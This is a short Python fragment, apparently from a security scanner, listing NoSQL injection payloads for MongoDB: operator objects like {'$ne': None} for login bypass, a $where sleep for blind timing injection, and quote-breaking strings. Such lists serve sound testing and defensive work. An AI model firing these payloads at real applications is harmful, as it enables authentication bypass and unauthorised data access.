# Payloads specifically designed to break MongoDB/NoSQL logic
NOSQL_JSON_PAYLOADS = [
    # Basic Authentication Bypass
    {"$ne": None},          # "Not Equal to Null" (Matches everything)
    {"$ne": ""},            # "Not Equal to Empty String"
    {"$gt": ""},            # "Greater Than Empty String"
    {"$regex": ".*"},       # "Match Any String" regex

    # Time-Based / Blind (Specific to MongoDB $where operator)
    {"$where": "sleep(5000)"}, 
    "'; return (new Date().getTime() > 10000) || '",
]

# Simple error-inducing strings for query parameters
NOSQL_STRING_PAYLOADS = [
    "'", 
    "\"", 
    "|| 1==1", 
    "'; return true; var foo='"
]